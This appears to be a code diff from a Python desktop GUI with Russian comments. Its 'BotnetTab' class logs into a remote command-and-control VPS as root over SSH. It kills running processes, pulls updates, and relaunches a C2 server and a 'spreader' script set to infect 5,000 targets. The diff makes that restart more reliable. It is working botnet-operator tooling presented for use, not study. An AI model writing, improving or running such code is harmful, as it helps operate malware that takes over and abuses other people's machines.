@@ -322,7 +322,6 @@ class BotnetTab(ttk.Frame):
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
-                # Путь к спредеру из botnet/
                 cmd = f"cd /root/c2 && python3 -u botnet/spreader.py --count {count}"
                 stdin, stdout, stderr = client.exec_command(cmd)
                 for line in iter(stdout.readline, ""):
@@ -333,7 +332,7 @@ class BotnetTab(ttk.Frame):
                 self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
         threading.Thread(target=run, daemon=True).start()
 
-    # ----- Обновление VPS -----
+    # ----- Обновление VPS (надёжная версия) -----
     def update_vps(self):
         if not self.vps_pass:
             self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
@@ -346,19 +345,25 @@ class BotnetTab(ttk.Frame):
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=10)
+
+                # Остановка старых процессов
+                stop_cmd = "pkill -f botnet/c2.py; pkill -f botnet/spreader.py"
+                client.exec_command(stop_cmd)
+
                 # git pull
                 update_cmd = "cd /root/c2 && git pull origin main"
                 stdin, stdout, stderr = client.exec_command(update_cmd)
                 out = stdout.read().decode()
                 err = stderr.read().decode()
                 self.spread_log.insert(tk.END, out + "\n" + err + "\n")
-                # перезапуск C2 (из botnet/) и спредера
-                restart_cmd = ("cd /root/c2 && pkill -f c2.py; pkill -f spreader.py; "
-                               "nohup python3 botnet/c2.py > c2.log 2>&1 & "
-                               "sleep 2; "
-                               "nohup python3 -u botnet/spreader.py --count 5000 >> spreader.log 2>&1 &")
-                stdin, stdout, stderr = client.exec_command(restart_cmd)
-                self.spread_log.insert(tk.END, "[+] VPS обновлён и перезапущен\n")
+
+                # Запуск с абсолютными путями и nohup
+                start_c2 = "cd /root/c2 && nohup /usr/bin/python3 /root/c2/botnet/c2.py > /root/c2/c2.log 2>&1 &"
+                start_spreader = "cd /root/c2 && nohup /usr/bin/python3 -u /root/c2/botnet/spreader.py --count 5000 >> /root/c2/spreader.log 2>&1 &"
+                client.exec_command(start_c2)
+                client.exec_command(start_spreader)
+
+                self.spread_log.insert(tk.END, "[+] VPS обновлён и запущен\n")
                 client.close()
             except Exception as e:
                 self.spread_log.insert(tk.END, f"[!] Ошибка обновления VPS: {e}\n")
